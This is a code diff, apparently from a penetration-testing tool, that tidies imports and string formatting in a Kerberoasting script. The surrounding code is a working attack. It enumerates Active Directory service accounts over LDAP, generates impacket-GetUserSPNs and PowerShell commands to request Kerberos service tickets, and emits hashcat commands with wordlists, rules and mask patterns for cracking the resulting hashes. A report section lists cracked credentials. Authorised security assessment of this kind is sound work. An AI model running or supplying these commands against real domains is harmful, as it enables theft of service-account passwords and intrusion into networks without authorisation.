@@ -18,15 +18,14 @@ Requirements:
 """
 
 import argparse
-import json
 import sys
 from datetime import datetime
 from pathlib import Path
 
 try:
     from rich.console import Console
-    from rich.table import Table
     from rich.panel import Panel
+    from rich.table import Table
 except ImportError:
     print("[!] Missing dependencies. Install with: pip install rich")
     sys.exit(1)
@@ -40,7 +39,7 @@ def enumerate_spn_accounts(domain: str, dc_ip: str, username: str, password: str
 
     try:
         import ldap3
-        from ldap3 import Server, Connection, SUBTREE, ALL
+        from ldap3 import ALL, SUBTREE, Connection, Server
 
         # Build LDAP connection
         server = Server(dc_ip, get_info=ALL, use_ssl=False)
@@ -117,14 +116,8 @@ def enumerate_spn_accounts(domain: str, dc_ip: str, username: str, password: str
 def request_tgs_tickets(domain: str, dc_ip: str, username: str, password: str, target_users: list[str] | None = None) -> str:
     """Request TGS tickets for SPN accounts using Impacket."""
     try:
-        from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
-        from impacket.krb5 import constants
-        from impacket.krb5.types import Principal, KerberosTime
-        from impacket import version
-        import impacket.krb5.asn1
-
         console.print("[yellow][*] Requesting TGS tickets via Impacket...[/yellow]")
-        console.print(f"[yellow][*] Use impacket-GetUserSPNs for production usage:[/yellow]")
+        console.print("[yellow][*] Use impacket-GetUserSPNs for production usage:[/yellow]")
         console.print(f"[cyan]impacket-GetUserSPNs {domain}/{username}:'{password}' -dc-ip {dc_ip} -request -outputfile kerberoast.txt[/cyan]")
 
         return f"impacket-GetUserSPNs {domain}/{username}:'{password}' -dc-ip {dc_ip} -request -outputfile kerberoast.txt"
@@ -134,7 +127,7 @@ def request_tgs_tickets(domain: str, dc_ip: str, username: str, password: str, t
 
         commands = []
         # Generate Impacket command
-        commands.append(f"# Impacket GetUserSPNs (Linux)")
+        commands.append("# Impacket GetUserSPNs (Linux)")
         commands.append(f"impacket-GetUserSPNs {domain}/{username}:'{password}' -dc-ip {dc_ip} -request -outputfile kerberoast.txt")
         commands.append("")
 
@@ -147,34 +140,32 @@ def request_tgs_tickets(domain: str, dc_ip: str, username: str, password: str, t
         commands.append("# PowerShell native")
         commands.append("Add-Type -AssemblyName System.IdentityModel")
         if target_users:
-            for user in target_users:
-                commands.append(f'# New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "{user}"')
+            commands.extend(f'# New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "{user}"' for user in target_users)
 
         return "\n".join(commands)
 
 
 def generate_hashcat_commands(hash_file: str) -> list[str]:
     """Generate hashcat commands for cracking Kerberoast hashes."""
-    commands = [
-        f"# RC4 (etype 23) - Most common",
+    return [
+        "# RC4 (etype 23) - Most common",
         f"hashcat -m 13100 {hash_file} /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
         "",
-        f"# AES-128 (etype 17)",
+        "# AES-128 (etype 17)",
         f"hashcat -m 19700 {hash_file} /usr/share/wordlists/rockyou.txt",
         "",
-        f"# AES-256 (etype 18)",
+        "# AES-256 (etype 18)",
         f"hashcat -m 19800 {hash_file} /usr/share/wordlists/rockyou.txt",
         "",
-        f"# Mask attack for common patterns (Season+Year+Special)",
+        "# Mask attack for common patterns (Season+Year+Special)",
         f"hashcat -m 13100 {hash_file} -a 3 '?u?l?l?l?l?l?d?d?d?d?s'",
         "",
-        f"# Combined wordlist + rules",
+        "# Combined wordlist + rules",
         f"hashcat -m 13100 {hash_file} wordlist.txt -r /usr/share/hashcat/rules/d3ad0ne.rule",
         "",
-        f"# Show cracked passwords",
+        "# Show cracked passwords",
         f"hashcat -m 13100 {hash_file} --show",
     ]
-    return commands
 
 
 def analyze_hash_file(hash_file: str) -> dict:
@@ -254,7 +245,7 @@ Kerberoasting assessment identified **{len(accounts)}** domain accounts with Ser
 """
 
     if cracked:
-        report += f"""
+        report += """
 ## 4. Cracked Credentials
 
 | Account | Password Strength | Admin | Impact |
